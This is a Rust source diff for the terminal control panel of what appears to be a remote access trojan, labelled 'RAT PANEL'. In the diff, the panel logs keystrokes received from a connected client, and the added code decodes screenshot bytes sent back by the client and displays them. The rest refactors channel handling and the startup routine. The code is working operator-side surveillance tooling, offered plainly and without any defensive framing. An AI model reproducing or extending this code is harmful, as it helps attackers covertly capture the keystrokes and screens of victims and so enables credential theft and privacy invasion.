@@ -21,40 +21,10 @@ use ratatui_image::{
     picker::Picker,
 };
 
-use tokio::sync::mpsc::{self, UnboundedReceiver};
 use image::ImageReader;
 use futures::{FutureExt, StreamExt};
 
 use crate::server::ClientEvent;
-
-pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
-    enable_raw_mode()?;
-    let mut stdout = io::stdout();
-    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
-    let backend = CrosstermBackend::new(stdout);
-    let mut terminal = Terminal::new(backend)?;
-
-    let (tx, rx) = mpsc::unbounded_channel::<ResizeRequest>();
-    let protocol = Picker::from_query_stdio()?
-        .new_resize_protocol(ImageReader::open("D:/фото/DSCN4215.jpg")?.decode()?);
-
-    let app = App::new(" ◈ RAT PANEL ", ThreadProtocol::new(tx, Some(protocol)));
-    let app_result = run_app(&mut terminal, app, tick_rate, rx).await;
-
-    disable_raw_mode()?;
-    execute!(
-        terminal.backend_mut(),
-        LeaveAlternateScreen,
-        DisableMouseCapture
-    )?;
-    terminal.show_cursor()?;
-
-    if let Err(err) = app_result {
-        println!("{err:?}");
-    }
-
-    Ok(())
-}
 
 fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
     app.screenshot
@@ -72,7 +42,18 @@ fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn 
                 app.logged_keys.push_str(key);
             } else if bytes.ends_with(b"screenshot") {
                 bytes.truncate(bytes.len() - b"screenshot".len());
-                
+
+                let image = ImageReader::new(
+                    std::io::Cursor::new(bytes)
+                )
+                .with_guessed_format()?
+                .decode()?;
+
+                let protocol = Picker::from_query_stdio()?
+                    .new_resize_protocol(image);
+
+                let tx_clone = app.tx.clone();
+                app.screenshot = ThreadProtocol::new(tx_clone, Some(protocol))
             }   
         },  
         ClientEvent::Disconnected => { app.client_addr = String::new() },
@@ -99,11 +80,35 @@ async fn handle_app_event(app: &'_ mut App<'_>, event: Result<Event, std::io::Er
     Ok(())
 }
 
+pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
+    enable_raw_mode()?;
+    let mut stdout = io::stdout();
+    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
+    let backend = CrosstermBackend::new(stdout);
+    let mut terminal = Terminal::new(backend)?;
+
+    let app = App::new(" ◈ RAT PANEL ");
+    let app_result = run_app(&mut terminal, app, tick_rate).await;
+
+    disable_raw_mode()?;
+    execute!(
+        terminal.backend_mut(),
+        LeaveAlternateScreen,
+        DisableMouseCapture
+    )?;
+    terminal.show_cursor()?;
+
+    if let Err(err) = app_result {
+        println!("{err:?}");
+    }
+
+    Ok(())
+}
+
 async fn run_app<B: Backend>(
     terminal: &mut Terminal<B>,
     mut app: App<'_>,
     tick_rate: Duration,
-    mut rx: UnboundedReceiver<ResizeRequest>,
 ) -> Result<(), Box<dyn Error>>
 where
     B::Error: 'static,
@@ -114,11 +119,11 @@ where
         terminal.draw(|frame| ui::render(frame, &mut app))?;
 
         tokio::select! {
-            Some(request) = rx.recv() => handle_request(&mut app, request)?,
+            Some(request) = app.rx.recv() => handle_request(&mut app, request)?,
             Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
             Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
         }
-        
+
         let timeout = tick_rate.saturating_sub(last_tick.elapsed());
         if !event::poll(timeout)? {
             app.on_tick();
